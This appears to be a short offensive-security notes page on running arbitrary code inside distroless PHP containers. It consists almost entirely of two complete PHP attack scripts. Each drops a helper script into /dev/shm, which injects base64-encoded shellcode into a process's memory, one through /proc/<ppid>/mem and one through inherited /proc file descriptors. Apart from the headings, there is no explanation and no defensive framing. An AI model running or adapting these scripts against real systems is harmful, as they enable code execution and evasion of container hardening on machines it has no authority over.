
## Run distroless PHP cli

docker run -it --rm cgr.dev/chainguard/php -a

## RCE in PHP main technique
```php
# This RCE writes to the parent /proc/self, which might not be allowed
# Payload
$shellcode_executor_content='<?php
sleep(0.5);
$ppid = posix_getppid();
$data = file_get_contents("/proc/$ppid/syscall");
$data_array = explode(" ", $data);
$mem_addr = trim($data_array[8]);
$dec_offset = hexdec($mem_addr);
$shellcode_b64 = "gCiI0qCIqPLgDx/44AMAkSEAAcroIoDSAQAA1MgFgNIBAADUiBWA0gEAANRhAoDSKBCA0gEAANQ=";
$shellcode = base64_decode($shellcode_b64);
$fd = fopen("/proc/$ppid/mem", "r+");
fseek($fd,$dec_offset);
fwrite($fd, $shellcode);
fclose($fd);
?>';

# Save in disk
$fd = fopen("/dev/shm/shellcode_executor.php", "w");
fwrite($fd, $shellcode_executor_content);
fclose($fd);

# Execute
$cmd = "php /dev/shm/shellcode_executor.php";
exec($cmd);
sleep(1);
```




## RCE in PHP via leaked handles

```php
# This RCE inherits FDs from parent to write to them
# Payload
$shellcode_executor_content='<?php
sleep(0.5);
$ppid = posix_getppid();
$data = file_get_contents("/proc/self/fd/".$argv[1]);
$data_array = explode(" ", $data);
$mem_addr = trim($data_array[8]);
$dec_offset = hexdec($mem_addr);
echo $dec_offset;
$shellcode_b64 = "gCiI0qCIqPLgDx/44AMAkSEAAcroIoDSAQAA1MgFgNIBAADUiBWA0gEAANRhAoDSKBCA0gEAANQ=";
$shellcode = base64_decode($shellcode_b64);
$fd = fopen("/proc/self/fd/".$argv[2], "r+");
fseek($fd,$dec_offset);
fwrite($fd, $shellcode);
fclose($fd);
?>';

# Save in disk
$fd = fopen("/dev/shm/shellcode_executor.php", "w");
fwrite($fd, $shellcode_executor_content);
fclose($fd);

# Generate fds to inherit
function get_fd_n($real_filename) {
    $dir = '/proc/self/fd/';
    if ($dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
            $filename = $dir . $file;
            if (filetype($filename) == 'link' && str_ends_with(realpath($filename),$real_filename)) {
              closedir($dh);
              return $file;
            }
        }
        closedir($dh);
    }
    return FALSE;
}

$fd_syscall = fopen("/proc/self/syscall", "r");
$syscall_fd_n = get_fd_n("/syscall");

$fd_mem = fopen("/proc/self/mem", "r+");
$mem_fd_n = get_fd_n("/mem");

# Execute
$cmd = "php /dev/shm/shellcode_executor.php $syscall_fd_n $mem_fd_n";
exec($cmd);
sleep(1);
?>
```